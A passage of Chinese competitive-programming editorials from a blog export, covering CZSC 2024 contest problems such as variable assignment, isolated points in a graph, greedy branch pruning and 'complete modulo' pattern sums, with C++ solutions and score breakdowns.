2，...以此类推。然后我们开个三维数组来存放一个变量的数据就好了。\n\n**问题5：我们之前把数字也拿字符串存储起来了，那么怎么把字符串类型转int类型**\n\n你开个循环，枚举字符串的字符。然后计算即可。\n\n到此为止，我们先把代码给出来：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint bu[27][27][27];\nint main(){\n\tios::sync_with_stdio(false);\n\tint n;cin>>n;\n\twhile(n--){\n\t\tchar a[4],b[30],c;  // c是读入进来的等号，可以直接丢弃\n\t\tmemset(a,0,sizeof(a));  // 局部变量默认值为随机数据，我们需要清空一下\n\t\tmemset(b,0,sizeof(b));\n\t\tcin>>a>>c>>b;\n\t\tif(b[0]>='0'&&b[0]<='9'){  // 判断等号右边是变量还是数字\n            // 下面这两行代码是为了把一个字符串转为int类型，不理解的话你可以手动模拟一下\n\t\t\tint res=0,len=strlen(b);\n\t\t\tfor(int i=0;i<len;i++) res*=10,res+=b[i]-'0';\n\t\t\tbu[a[0]-'a'+1][max(0,a[1]-'a'+1)][max(0,a[2]-'a'+1)]=res;\n\t\t}\n\t\telse bu[a[0]-'a'+1][max(0,a[1]-'a'+1)][max(0,a[2]-'a'+1)]=bu[b[0]-'a'+1][max(0,b[1]-'a'+1)][max(0,b[2]-'a'+1)];\n\t}\n\treturn 0;\n}\n```\n\n**问题6：`max(0,a[1]-'a'+1)` 是什么意思?**\n\n由于变量名不一定是三个字符，也可能是一个字符或者两个字符。我们把左侧变量名存到了 char数组 中且初始值数组中的所有数据都被我们清空，变成0了。当变量名为两个字符时，a[2] 就为0了。当变量名为一个字符时，a[1] 和 a[2] 就为0了。如果我们还 `a[1]-'a'+1` 的话显然就变负数了。所以我们考虑这么设计：我们把两个字符也看作三个字符，只不过第三个字符是空白，我们将空白对应数字 0。于是就有了 `max(0,a[1]-'a'+1)`\n\n**问题7：为什么使用char数组来存字符串而不是使用string类型？**\n\n如果我们用string类型的话，比如，如果这个字符串长度为1的话，我们直接 str[2] 的话可能就越界了。而使用char数组的话就可以规避这个问题\n\n不过你也能使用string，你判断一下这个字符串长度，如果长度为 1 就 `bu[a[0]-'a'+1][0][0]`，如果长度为 2 就 `bu[a[0]-'a'+1][a[1]-'a'+1][0]`，长度为 3 同理。\n\n**问题8：为什么char数组的长度要开成这样？**\n\na数组存变量，变量的长度最大为3，所以理论上 `char a[3]` 即可。但实际上你读入一个字符后，c++还会额外读入一个字符 `'0'`，这个字符是个空白字符，对应的ascii码为0，表示这个字符串结束了。当字符串长度为 3 时，直接cin读入到 `char a[3]` ，最后表示结束的那个特殊字符就存不下了。而 strlen 的函数获取字符串长度的原理就是扫一遍这个字符串，直到扫到了 `'0'` 这个表示结束的特殊字符，来计算字符串的长度。如果你最后那个特殊字符存不下，就导致 strlen函数出问题，就会导致整个程序出奇怪问题。所以我们需要把数组开大一些。\n\nb数组即可能存变量名称，也可能存数字，你就尽可能开大一些就好了。\n\n实际上，问题6中我们引入的那个”空白“你就可以理解为这个 `'0'`，表示空白字符\n\n**问题9：按字典序输出怎么搞？**\n\n我们上述的设计，把 a 对应 1，把 b 对应 2，....，以此类推，同时把”空白“对应数字0，比如\n\n```\na\t\t对应 100\naa \t\t对应 110\nab\t\t对应 120\nabc\t\t对应 123\nbc\t\t对应 230\n```\n\n我们发现，左边的字符是按字典序排序的，右边对应的数字也是从小到大排序的！\n\n所以我们开三层循环，枚举每一位即可。枚举的顺序就是按字典序排序的。\n\n**问题10：我怎么知道哪些变量赋值了**\n\n由于题目中说了，给变量赋值的时候一定是把一个非负整数赋值，所以我们可以先考虑把上述代码中的 bu 数组初始时都设置为 -1，然后最后输出的时候判断一下，如果就为 -1 就说明没有被赋值，跳过即可。\n\n完整代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint bu[27][27][27];\nint main(){\n\tios::sync_with_stdio(false);\n\tmemset(bu,-1,sizeof(bu));  // 新加代码\n\tint n;cin>>n;\n\twhile(n--){\n\t\tchar a[4],b[30],c;\n\t\tmemset(a,0,sizeof(a));\n\t\tmemset(b,0,sizeof(b));\n\t\tcin>>a>>c>>b;\n\t\tif(b[0]>='0'&&b[0]<='9'){\n\t\t\tint res=0,len=strlen(b);\n\t\t\tfor(int i=0;i<len;i++) res*=10,res+=b[i]-'0';\n\t\t\tbu[a[0]-'a'+1][max(0,a[1]-'a'+1)][max(0,a[2]-'a'+1)]=res;\n\t\t}\n\t\telse bu[a[0]-'a'+1][max(0,a[1]-'a'+1)][max(0,a[2]-'a'+1)]=bu[b[0]-'a'+1][max(0,b[1]-'a'+1)][max(0,b[2]-'a'+1)];\n\t}\n    // 输出部分\n\tfor(int i=0;i<27;i++){\n\t\tfor(int j=0;j<27;j++){\n\t\t\tfor(int k=0;k<27;k++){\n\t\t\t\tif(bu[i][j][k]!=-1){  // 判断变量是否赋值了\n\t\t\t\t\tstring var=\"\";  // 通过枚举的 i, j, k 计算对应的变量名称\n\t\t\t\t\tvar+=(char)('a'+i-1);  // 变量名称的第一个字符\n\t\t\t\t\tif(j) var+=(char)('a'+j-1);  // j=0时说明是\"空白\"\n\t\t\t\t\tif(k) var+=(char)('a'+k-1);  // k=0时说明是\"空白\"\n\t\t\t\t\tcout<<var<<\" = \"<<bu[i][j][k]<<endl;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n### 更多\n\n我们知道，ascii码实际上告诉了我们一个字符其实对应了一个数字。而本题这一部分：\n\n```\na\t\t对应 100\naa \t\t对应 110\nab\t\t对应 120\nabc\t\t对应 123\nbc\t\t对应 230\n```\n\n貌似做到了把一个字符串对应了一个数字。\n\n所以，我们是不是可以也让一个字符串对应一个数字呢？答案是可以的，这涉及到了哈希算法，我们之后也会学习，感兴趣的可以了解一下。\n\n本题实际上还能有一个更简便的解法。使用map这个东西可以让我们很轻易地解决这个题。我们之后也会学习，感兴趣的可以了解一下。\n\n","summary":"本篇文章是举行在2024年8月26日的 CZSC2024第二次 的题解","key":["czoi"],"tags":[],"path":["算法竞赛","CZOI","CZSC2024","CZSC 2024 第二次 题解.md"],"background":"https://www.caiwen.work/czoi2024.jpg","recommend":false,"status":"published"},{"type":"Article","title":"CZSC 2024 第一次 题解","id":"czsc2024-1-tijie","createTime":"2024-08-18T12:59:00.000Z","updateTime":"2025-09-05T13:34:06.524Z","content":"\n::: success 说明\n本篇文章是举行在2024年8月18日的 CZSC2024第一次 的题解\n\n比赛页：https://www.luogu.com.cn/contest/188106\n\nT1点：https://www.luogu.com.cn/problem/T484700\n\nT2修剪树枝：https://www.luogu.com.cn/problem/T488675\n\nT3取模：https://www.luogu.com.cn/problem/T485663\n\nT4填数游戏：https://www.luogu.com.cn/problem/T488688\n:::\n\n## 概览\n\n- 暴力打满：80+16+20+32=148pts\n- 优秀：100+40+36+48=224pts\n\n相对水平推测（以完全零基础为基准）：\n\n- 河北NOIP三等：50pts\n- 河北NOIP二等：100pts\n- 河北NOIP一等：150pts\n- CCF六级：224pts\n- CCF七级/河北省队：300pts\n\n绝对水平推测（以选手完全学习信竞后的水平为基准）：\n\n- 河北NOIP三等：200pts\n- 河北NOIP二等：348pts\n- 河北NOIP一等：400pts\n\n简要题解\n\n- **T1** 直接记录一个点有没有被连接就行，每次操作的时候去判断并记录，顺便统计答案。\n- **T2** 先从小到大排序，枚举剪刀硬度的同时枚举树枝硬度，一个个匹配，这就是最优的选择方案。\n- **T3** 直接找规律，规律找到后拿高斯求和公式直接计算即可。\n- **T4** 先考虑分数全正且相同的情况，再考虑全正但不同的情况，负数情况同理。然后考虑单调递增的情况，然后再考虑先负后正的情况。这些特殊情况都是不难考虑的。于是你发现，所有的一般情况都是上述特殊情况的组合。\n\n## T1 点\n\n### 概览\n\n本题考察选手最基本的 C++ 语法，但不落俗套，需要选手有少量的思考。题目以图论为背景，看似是超纲的，但实际上只需要稍加观察即可找到突破口。\n\n需要选手有基本的C++语法知识。\n\n难度：<span style=\"color:rgb(254,76,97)\">入门</span>\n\n详细考察点：C++ 基本语法、题目转化、时间复杂度分析\n\n### 算法一\n\n不难发现，当 $n$ 为 $3$ 时，第一条边加入时必然就剩一个孤立点。如果再加一条边，必然是不存在孤立点了。再加一条边，仍然是不存在孤立点。\n\n所以只需要根据 $m$ 的大小输出即可。参考代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tif(m==1){\n\t\tcout<<1;\n\t}\n\tif(m==2){\n\t\tcout<<1<<endl<<0;\n\t}\n\tif(m==3){\n\t\tcout<<1<<endl<<0<<endl<<0;\n\t}\n\treturn 0;\n}\n```\n\n以上代码可通过测试点 $1\\sim2$ ，期望得分 $8pts$。\n\n### 算法二\n\n对于满足 $y=x+1$ 性质的测试点，结合题目说不会重复地将两点相连，我们考虑，数据大致应该是这样：先把点 $1$ 和点 $2$ 连接，再把点 $2$ 和点 $3$ 连接，再把点 $3$ 和点 $4$ 连接......，直到将点 $n-1$ 与点 $n$ 连接。实际上 $m=n-1$ 。我们发现，第一条边加入后，立刻有两个点变为了非孤立点，孤立点数量为 $n-2$。此后，每加入一条边，都会让孤立点减少一个。\n\n然后我们紧接着再看对于满足 $x=1$ 性质的测试点，结合题目说不会重复地将两点相连，我们考虑，数据大致应该是这样：先把点 $1$ 和点 $2$ 连接，再把点 $1$ 和点 $3$ 连接，再把点 $1$ 和点 $4$ 连接......，直到将点 $1$ 与点 $n$ 连接。实际上 $m=n-1$ 。我们发现，孤立点数量的变化和上述情况是相同的。\n\n综上，所以我们只需要从 $n-2$ 倒着输出到 $0$ 即可，参考代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tfor(int i=n-2;i>=0;i--){\n\t\tcout<<i<<endl;\n\t}\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $15\\sim20$ 。期望得分 $24pts$。结合算法一可获得 $32pts$。\n\n### 算法三\n\n我们还可以开一个数组 $tag$， $tag[i]$ 表示点 $i$ 连接了多少个边。当给点 $u$ 和 $v$ 连边的时候只需要 $tag[u]++$，$tag[v]++$。如果 $tag[i]=0$，则说明点 $i$ 没有与任何边连接，也就是点 $i$ 为孤立点。\n\n我们可以有这样的代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint tag[200005];\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tfor(int i=1;i<=m;i++){\n\t\tint x,y;\n\t\tcin>>x>>y;\n\t\ttag[x]++;\n\t\ttag[y]++;\n\t\tint ans=0;\n\t\tfor(int i=1;i<=n;i++){\n\t\t\tif(tag[i]==0){\n\t\t\t\tans++;\n\t\t\t}\n\t\t}\n\t\tcout<<ans<<endl;\n\t}\n\treturn 0;\n}\n```\n\n分析时间复杂度，应该是 $O(mn)$ 的，只能通过测试点 $1\\sim20$ ，期望得分 $80pts$。\n\n### 算法四（正解）\n\n我们需要注意到这样的两点\n\n- 一个点不是孤立点后，无论再怎样加边，都不可能再变回孤立点\n- 随着添加边数的增加，孤立点数量一定是单调不增的\n\n所以我们在算法三的基础上进行改进，我们定义变量 $ans$ 表示当前孤立点数量，初始时 $ans=n$。当给点 $u$ 和 $v$ 连边的时候，如果 $tag[u]=0$，说明点 $u$ 原来是孤立点，现在不是了（有边相连了），$ans--$ 即可。点 $v$ 同理。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define _ 200005\nusing namespace std;\nint tag[_];\nint main(){\n\tios::sync_with_stdio(false);\n\tint n,m;cin>>n>>m;\n\tint ans=n;\n\tfor(int i=1;i<=m;i++){\n\t\tint x,y;cin>>x>>y;\n\t\tif(!tag[x]) ans--;\n\t\tif(!tag[y]) ans--;\n\t\ttag[x]++;tag[y]++;\n\t\tcout<<ans<<endl;\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(m)$，可以通过所有测试点，期望得分 $100pts$。\n\n## T2 修剪树枝\n\n### 概览\n\n本题需要选手考虑到剪刀和树枝对应的最佳方案。\n\n需要选手有一定的思考但代码量不高。\n\n难度：<span style=\"color: rgb(243,156,17)\">普及-</span> 到 <span style=\"color: rgb(255,193,22)\">普及/提高-</span> 之间\n\n详细考察点：C++ 基本语法、排序算法、贪心算法、双指针、时间复杂度分析\n\n### 算法一\n\n八仙过海各显神通了\n\n可能通过了测试点 $1\\sim 8$ ，期望得分 $32pts$。\n\n### 算法二\n\n考虑 $n=1$ 的情况，显然答案要么是 $0$ 要么是 $1$。我们只需要找到所有树枝中坚硬程度最小的树枝，判断能否使用这唯一的剪刀剪掉即可。如果硬度最小的树枝都剪不了，其他的树枝也就别想了。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint a[200005],b[200005];\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=m;i++) cin>>b[i];\n\tsort(b+1,b+m+1);\n\tif(a[1]>=b[1]) cout<<1;\n\telse cout<<0;\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $9$，期望得分 $4pts$。当然你还可以使用 $O(n)$ 的方法，遍历一遍数组 $b$ 找到最小值。\n\n接着我们考虑 $m=1$ 的情况，我们只需要找到坚硬程度最大的剪刀，判断能不能剪掉这唯一的树枝即可。如果硬度最大的剪刀都剪不了，其他的剪刀也就别想了。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint a[200005],b[200005];\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=m;i++) cin>>b[i];\n\tsort(a+1,a+n+1);\n\tif(a[n]>=b[1]) cout<<1;\n\telse cout<<0;\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $10$，期望得分 $4pts$。\n\n两个代码结合起来可以获得 $8pts$ 。\n\n### 算法三\n\n考虑特殊性质 $A$ ，因为所有的 $a_i$ 都相同，我们设这个相同的值为 $k$。然后我们可以扫一下 $b$ 序列，求出有多少个树枝坚硬程度小于等于 $k$，我们假设有 $x$ 个。然后我们就知道了有 $x$ 个树枝可以被剪掉。\n\n但你还需要比较一下 $x$ 和 $n$ 哪个大，因为一个剪刀只能用一次。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint a[200005],b[200005];\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=m;i++) cin>>b[i];\n\tint x=0,k=a[1];\n\tfor(int i=1;i<=m;i++){\n\t\tif(k>=b[i]) x++;\n\t}\n\tcout<<min(x,n);\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $11$，期望得分 $4pts$。结合算法二可获得 $12pts$。\n\n考虑特殊性质 $B$ ，和上述的做法差不多，代码如下：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint a[200005],b[200005];\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=m;i++) cin>>b[i];\n\tint x=0,k=b[1];\n\tfor(int i=1;i<=n;i++){\n\t\tif(a[i]>=k) x++;\n\t}\n\tcout<<min(x,m);\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $12$，期望得分 $4pts$。两份代码结合起来可获得 $8pts$，再结合算法二可获得 $16pts$。\n\n### 算法四\n\n我们继续考虑，如果想剪更多的树枝，那么应该当然是柿子找软的捏，尽量从树枝硬度比较小的开始处理。所以我们可能要把数组 $b$ 从小到大排序。\n\n然后我们考虑怎么去利用我们手上的剪刀。我们显然是不能把一个硬度很大的剪刀去剪硬度很小的树枝，因为夸张点说这属于大炮轰蚊子，会造成浪费的，我们最好是让剪刀利用地刚刚好。我们把硬度大的剪刀留在后面，先利用硬度小的剪刀，硬度较小的树枝只需要让硬度较小的剪刀去干就好了。所以我们也对数组 $a$ 从小到大排序。\n\n然后我们从第一个剪刀开始枚举，看看当前枚举的剪刀能不能利用上。从硬度最小的树枝开始，从小到大去看看当前枚举到的剪刀能不能剪当前枚举到的树枝。这样就能做到硬度较小的剪刀能剪去硬度较小的树枝，利用的情况应该是刚刚好的。\n\n注意可能还要开个数组来判断树枝是否已经被剪掉了。\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nint a[200005],b[200005],ok[200005];\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=m;i++) cin>>b[i];\n\tsort(a+1,a+n+1);\n\tsort(b+1,b+m+1);\n\tint ans=0;\n\tfor(int i=1;i<=n;i++){\n\t\tfor(int j=1;j<=m;j++){\n\t\t\tif(ok[j]!=0) continue;//说明已经树枝被剪掉了，跳过\n\t\t\tif(a[i]>=b[j]){\n\t\t\t    ok[j]=1;\n\t\t\t\tans++;\n\t\t\t\tbreak;//能剪就剪，剪完之后该剪刀就不能用了，内层循环要跳出去\n\t\t\t}\n\t\t}\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n以上代码的时间复杂度为 $O(nm)$ ，可以通过测试点 $1\\sim10$ 期望得分 $40pts$。\n\n### 算法五（正解）\n\n算法四其实是有很多没必要的操作的。你观察一下就会发现，树枝一定是从硬度最小的树枝开始从小到大剪的。所以对于每个剪刀，你其实没必要每次都从头枚举 $b$ 数组，你只需要从上回循环跳出的位置继续枚举即可。\n\n实际上你并不需要继续枚举，你只需要判断一下就行，因为当前可以剪的硬度最小的树枝你都剪不掉，硬度更大的树枝更剪不掉了。\n\n具体参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define _ 200005\nusing namespace std;\nint a[_],b[_];\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint n,m;cin>>n>>m;\n\tfor(int i=1;i<=n;i++) cin>>a[i];\n\tfor(int i=1;i<=m;i++) cin>>b[i];\n\tsort(a+1,a+n+1);\n\tsort(b+1,b+m+1);\n\tint p=1,ans=0;//p用来记录当前枚举到的b数组的位置\n\tfor(int i=1;i<=n;i++){\n\t\tif(a[i]>=b[p]){\n\t\t\tans++;\n\t\t\tp++;//b[p]这个树枝被剪了，让p+1，下回循环就判断b[p+1]了\n\t\t\tif(p>m) break;//p都比m大了，直接跳出循环\n\t\t}\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n时间复杂度 $O(n)$ ，可以通过所有测试点，期望得分 $100pts$。\n\n其他验题者代码：\n\n范铭轩：\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\nconst int N = 200005;\nint a[N],b[N];\n\nint main(){\n\tint n,m;\n\tcin>>n>>m;\n\tfor(int i = 1;i <= n;++ i) cin>>a[i];\n\tfor(int i = 1;i <= m;++ i) cin>>b[i];\n\tsort(a + 1,a + n + 1);\n\tsort(b + 1,b + m + 1);\n\tint x = 1,y = 1,ans = 0;\n\twhile(x <= n && y <= m){\n\t\twhile(x <= n && a[x] < b[y]) x ++;\n\t\tif(x > n) break;\n\t\tans ++;\n\t\tx ++;\n\t\ty ++;\n\t}\n\tcout<<ans;\n\treturn 0;\n}\n```\n\n王添翼：\n\n```cpp\n#include<iostream>\n#include<algorithm>\n#define int long long\nusing namespace std;\n\nconst int N = 2e5;\nint a[N+10] , b[N+10];\nint n , m , ans , ap , bp;\n\nsigned main(){\n    cin >> n >> m;\n    for(int i = 1;i <= n;i ++) cin >> a[i];\n    sort( a + 1 , a + n + 1 );\n    for(int i = 1;i <= m;i ++) cin >> b[i];\n    sort( b + 1 , b + m + 1 );\n    ap = 1 , bp = 0;\n    while( ap != n+1 and bp != m ){\n        if( a[ap] >= b[bp+1] ){\n            ap ++ , bp ++;\n        }\n        else{\n            ap ++;\n        }\n    }\n    cout << bp << endl;\n    return 0;\n}\n```\n\n路浩祥\n\n```cpp\n#include <bits/stdc++.h>\nusing namespace std;\nint n,m,a[200005],b[200005],ans;\nint main()\n{\n\tcin>>n>>m;\n\tfor (int i=1;i<=n;i++)\n\t\tscanf(\"%d\",&a[i]);\n\tfor (int i=1;i<=m;i++)\n\t\tscanf(\"%d\",&b[i]);\n\tsort(a+1,a+n+1);\n\tsort(b+1,b+m+1);\n\tint i = 1, j = 1, count = 0;\n    while (i <= n && j <= m)\n\t{\n        if (a[i] >= b[j])\n\t\t{\n            count++;\n            i++;\n            j++;\n        }\n\t\telse i++;\n    }\n\tprintf(\"%d\",count);\n\treturn 0;\n}\n```\n\n## T3 取模\n\n### 概览\n\n本题的突破点在于选手能否发现所谓的\"完全取模\"的规律，在规律找到之后如何使用代码来更好地计算也是个挑战。\n\n需要选手具有较高的思维水平。\n\n难度：<span style=\"color: rgb(255,193,22)\">普及/提高-</span>。题目可以放在NOIP中的第一题位置作为签到题。\n\n详细考察点：C++ 基本语法、找规律、前缀和算法、高斯求和公式、取模运算、时间复杂度分析\n\n### 算法一\n\n题目怎么说你就怎么做。\n\n注意取模，还有 `#define int long long` 这些东西。都是课上讲的。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int mod=19260817;\nvoid solve(){\n\tint l,r,m,n;\n\tcin>>l>>r>>m>>n;\n\tint ans=0;\n\tfor(int i=l;i<=r;i++){\n\t\tint x=i;\n\t\tfor(int j=n;j>=m;j--){\n\t\t\tx%=j;\n\t\t}\n\t\tans+=x;\n\t\tans%=mod;\n\t}\n\tcout<<ans<<endl;\n}\nsigned main(){\n\tint T;cin>>T;\n\tfor(int i=1;i<=T;i++) solve();\n\treturn 0;\n}\n```\n\n时间复杂度 $O(Trn)$ 仅能通过测试点 $1\\sim3$ ，期望得分 $12pts$。\n\n### 算法二\n\n考虑特殊性质 $A$，我们直到如果一个数对比他还大的数取模，就等于他本身了，因此这种性质下，就相当于把 $[l,r]$ 区间内的所有数组都加起来。\n\n我们有下面这几个方案\n\n**做法一**\n\n直接开循环求和，我们练习题做过类似的。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int mod=19260817;\nvoid solve(){\n\tint l,r,m,n;\n\tcin>>l>>r>>m>>n;\n\tint ans=0;\n\tfor(int i=l;i<=r;i++){\n\t\tans+=i;\n\t\tans%=mod;\n\t}\n\tcout<<ans<<endl;\n}\nsigned main(){\n\tint T;cin>>T;\n\tfor(int i=1;i<=T;i++) solve();\n\treturn 0;\n}\n```\n\n时间复杂度 $O(Tr^2)$ 仅能通过测试点 $4$，期望得分 $4pts$\n\n**做法二**\n\n当 $l=1$ 的时候，就相当于从 $1$ 一直加到 $r$，有高斯的求和公式：\n\n$$\n\\frac{r(r+1)}{2}\n$$\n\n就可以做到时间复杂度 $O(T)$。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int mod=19260817;\nvoid solve(){\n\tint l,r,m,n;\n\tcin>>l>>r>>m>>n;\n\tint ans=0;\n\tans=r*(r+1)/2;\n\tans%=mod;\n\tcout<<ans<<endl;\n}\nsigned main(){\n\tint T;cin>>T;\n\tfor(int i=1;i<=T;i++) solve();\n\treturn 0;\n}\n```\n\n可以通过测试点 $5\\sim6$ ，期望得分 $8pts$。\n\n**做法三**\n\n那么 $l$ 不等于 $1$ 开始呢，求和公式是不是就用不上了？\n其实是还可以用上，我们考虑一种前缀和的思想，我们令 $sum_i$ 为从 $1$ 加到 $i$，那么区间 $[l,r]$ 内所有数字相加即为 $sum_r-sum_{l-1}$。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int mod=19260817;\nvoid solve(){\n\tint l,r,m,n;\n\tcin>>l>>r>>m>>n;\n\tint ans=0;\n\tint sum1=r*(r+1)/2;sum1%=mod;\n\tint sum2=(l-1)*l/2;sum2%=mod;\n\tans=(sum1-sum2+mod)%mod;\n\tcout<<ans<<endl;\n}\nsigned main(){\n\tint T;cin>>T;\n\tfor(int i=1;i<=T;i++) solve();\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $4\\sim8$ ，期望得分 $20pts$。\n\n### 算法三\n\n先考虑特殊性质 $D$。由于每组之间的 $m$ 和 $n$ 都相同，我们可以预处理一下。先计算从 $1$ 到 $2\\times10^6$ 中每个数完全取模后的结果，放到数组 $pre$。中，然后每组数据，只需要从 $pre[l]$ 加到 $pre[r]$ 即可求出答案。\n\n但这样如果不算上预处理，光处理询问，时间复杂度就是 $O(Tr)$ 的，并不能给我们很多分数。\n\n这种对一个数列多次询问区间总和的问题，我们可以使用前缀和算法。这样复杂度就到了 $O(T)$ 了。\n\n但我们再考虑预处理，每个数组都完全取模，时间复杂度要到达 $O(2\\times10^6\\times n)$，依然不能给我们很多分数。\n\n我们继续考虑，如果一个数对 $n$ 取模之后，得到的数仍然落在 $[m,n]$ 这个区间上，那么后续完全取模之后必然为 $0$，因为你必然会对他本身取模的。反之完全取模后就直接是仅对 $n$ 取模后的结果。所以其实所谓的完全取模只需取模一次再判断一下就可以了。这样时间复杂度就到了 $O(2\\times 10^6)$.\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int mod=19260817;\nint pre[2000006],sum[2000006];\nint flag=0;//是否已经预处理过了\nvoid solve(){\n\tint l,r,m,n;\n\tcin>>l>>r>>m>>n;\n\tif(flag==0){\n\t\tfor(int i=1;i<=2000000;i++){\n\t\t\tif(i%n>=m) pre[i]=0;\n\t\t\telse pre[i]=i%n;\n\t\t}\n        //这里是前缀和预处理\n\t\tfor(int i=1;i<=2000000;i++){\n\t\t\tsum[i]=(sum[i-1]+pre[i])%mod;\n\t\t}\n\t\tflag=1;\n\t}\n\tcout<<(sum[r]-sum[l-1]+mod)%mod<<endl;\n}\nsigned main(){\n\tint T;cin>>T;\n\tfor(int i=1;i<=T;i++) solve();\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $13\\sim 16$ ，期望得分 $16pts$。\n\n### 算法四\n\n考虑性质 $C$，若 $m$ 和 $n$ 相同，则相当于把 $[l,r]$ 上所有的数字对 $m$ 取模后相加。数字从 $1$ 开始依次对 $m$ 取模，我们能发现存在规律。比如 $m=3$ 时，\n\n- $1\\%3=1$\n\n- $2\\%3=2$\n- $3\\%3=0$\n- $4\\%3=1$\n- $5\\%3=2$\n- $6\\%3=0$\n- $7\\%3=1$\n- ......\n\n最后结果，应该是从 $1$ 增长到 $m-1$，然后是 $0$ ，这样的片段不断重复。又比如 $m=5$ 时是这样的\n\n`12340 12340 12340 12340 12340 12340..`\n\n我们将 `12340` 这样的称为一个块，发现块长度就为 $m$，块内所有数字之和为 $\\frac{m(m-1)}{2}$。\n\n然后我们应该是可以通过简单的数学计算来求出位于 $[l,r]$ 区间内这些数字之和了。不过需要注意的是，有可能是这样的：\n\n![](http://pic.caiwen.work/i/2025/01/24/679352a7552f9.png)\n\n也就是询问的区间包含了不完整的块。这种情况下处理起来不太方便。\n\n我们再回想之前算法二中做法三的做法以及性质 $B$ 给我们的提示，我们不难发现，处理 $[1,r]$ 这种区间，也就是左端点是 $1$ 开头的，是比较简单的，因为这样你只需要考虑右边那个完整的块了。至于要求 $[l,r]$ 的答案，只需要求出 $[1,r]$ 的答案和 $[1,l-1]$ 的答案再一减就好了。\n\n对于 $[1,r]$ 这种区间，$\\left \\lfloor \\frac{r}{m} \\right \\rfloor $ 为包含了多少个块。然后 $r\\%m $ 即为最后那个不完整的块的长度，记为 $k$，于是那个不完整的块内的数字求和为 $\\frac{k(k+1)}{2}$ 。\n\n对于 $[1,l-1]$ 区间同理。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int mod=19260817;\nvoid solve(){\n\tint l,r,m,n;\n\tcin>>l>>r>>m>>n;\n\tint sum=m*(m-1)/2%mod;\n\tint cnt1=r/m;\n\tint k1=r%m;\n\tint sum1=(cnt1*sum%mod+k1*(k1+1)/2%mod)%mod;\n\n\tint cnt2=(l-1)/m;\n\tint k2=(l-1)%m;\n\tint sum2=(cnt2*sum%mod+k2*(k2+1)/2%mod)%mod;\n\tcout<<(sum1-sum2+mod)%mod<<endl;\n}\nsigned main(){\n\tint T;cin>>T;\n\tfor(int i=1;i<=T;i++) solve();\n\treturn 0;\n}\n```\n\n以上代码可以通过测试点 $9\\sim 12$ ，期望得分 $16pts$。\n\n### 算法五（正解）\n\n考虑性质 $C$ 的时候我们试了几个数找出了规律，对于一般规律我们应该也是可以的。我们先假设 $m=3，n=5$，然后从 $1$ 开始一个一个看：\n\n- $1$ 完全取模后为 $1$\n- $2$ 完全取模后为 $2$\n\n- $3$ 完全取模后为 $0$\n- $4$ 完全取模后为 $0$\n- $5$ 完全取模后为 $0$\n- $6$ 完全取模后为 $1$\n\n然后你发现完全取模后的序列大概是\n\n`12000 12000 12000 ...`\n\n这样的。\n\n然后如果取 $m=4，n=6$，那么大概是这样的\n\n`123000 123000 123000 ...`\n\n然后你发现，块长度还是 $n$ 。但从第 $m-1$ 个数开始完全取模就为 $0$ 了，所以我们只需要在算法四代码的基础上稍加修改即可。\n\n参考代码：\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\nusing namespace std;\nconst int mod=19260817;\nsigned main(){\n\tios::sync_with_stdio(false);\n\tint T;cin>>T;\n\twhile(T--){\n\t\tint l,r,m,n;cin>>l>>r>>m>>n;\n\t\tl--;//给l-1，这样后面直接拿l计算即可\n\t\tif(m<=1){//判断一种特殊情况\n\t\t\tcout<<0<<endl;\n\t\t\tcontinue;\n\t\t}\n\t\tint sum=m*(m-1)/2%mod; //一个块中所有的数之和\n\n\t\tint v=r/n*sum%mod;//完整块内所有数之和\n\t\tint 